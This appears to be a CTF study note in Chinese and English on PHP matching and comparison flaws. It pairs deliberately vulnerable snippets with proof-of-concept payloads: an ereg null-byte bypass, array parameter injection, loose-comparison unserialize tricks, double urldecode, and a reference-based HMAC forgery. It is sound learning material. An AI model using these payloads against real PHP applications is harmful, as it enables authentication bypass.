---
title: "php match or comapre"
date: 2016-03-13 15:28
---

# match

## ereg

> int ereg() 返回整数类型

* example

```php
if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE){
	echo '<p>You password must be alphanumeric</p>';
}
else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999){
    if (strpos ($_GET['password'], '*-*') !== FALSE){
        die('Flag: ' . $flag);
    }
}
```

* poc 1

```
url: ...?password=1e9%00*-*
```

此处利用 **ereg 经典漏洞**，读到 ** %00 ** 就截止了

* poc 2

```
url: ...?password[]=s
``` 

**传入数组**

* ereg 返回** NULL** ，NULL !== FALSE is true
* strpos 处理数组，也返回 ** NULL **
* strlen 处理数组，同样返回 **NULL**

**比较**

* null 和 任何其他任何类型，比较，转换为 bool， FALSE < TRUE
* array 和  任何其他类型（不包括 object）， 比较， array 总是更大


## loose comparison(== operator) 

* example

```php
$flag='ctf_flag';
$unserialize_str = $_POST['password'];
$data_unserialize = unserialize($unserialize_str);
if($data_unserialize['user'] == '???' && $data_unserialize['pass']=='???')
{
    print_r($flag);
}
```

user, pass 的值是未知的，条件判断时使 $data_unserialize['user']=true ， $data_unserialize['pass']=true 即可

* poc

```php
$arr =  array();
$arr['user']=TRUE;
$arr['pass']=TRUE;
$seialize_str = serialize($arr);    //a:2:{s:4:"user";b:1;s:4:"pass";b:1;}
$flag='ctf_flag';
$data_unserialize = unserialize($serialize_str);
if($data_unserialize['user'] == '???' && $data_unserialize['pass']=='???')
{
    print_r($flag);
}
```

## urldecode

> string urldecode() 返回字符串类型 

urldecode 与 $_GET[] $_POST[] $_REQEST[] 联合使用

$_GET[] $_POST[] $_REQEST[] 返回的参数是**已经被解码了**的，在进行 urldecode 相当于 二次 urldecode

* poc

```php
$username = $_GET['username'];  //url: ...?username=%2561dmin   %61 is a
if (urldecode($username) === "admin"){
    echo "you are admin";
}
```

## reference

* example

```php
$auth = $_COOKIE['auth'];
if(get_magic_quotes_gpc())
    $auth = stripslashes($auth);
$auth = unserialize($auth);

if(!is_array($auth))    // hint auth is array
    return false;

$auth['hmac_t'] = sha1(sha1($auth['username'].$auth['hmac_t'].$auth['password']).$secret_salt);

if($auth['hmac_t'] !== $auth['hmac'])
    return false;
```

* poc

```php
$a = array("username" => "dragon", "password" => true, "hmac_t" => "0"); 
$a["hmac"] = &$a["hmac_t"]; // key point ****************
$a["hmac_t"] = 1; 
echo $a["hmac"]."\n";
echo urlencode(serialize($a)) . "\n";
```

1.**PHP 是可以直接取 Reference **

则 === 的 strict comparison 就 always true 了...因为都是一个** Object **

2.cookie 提交 auth 为 urlencode(serialize($a)) 或 serialize($a) 均可 
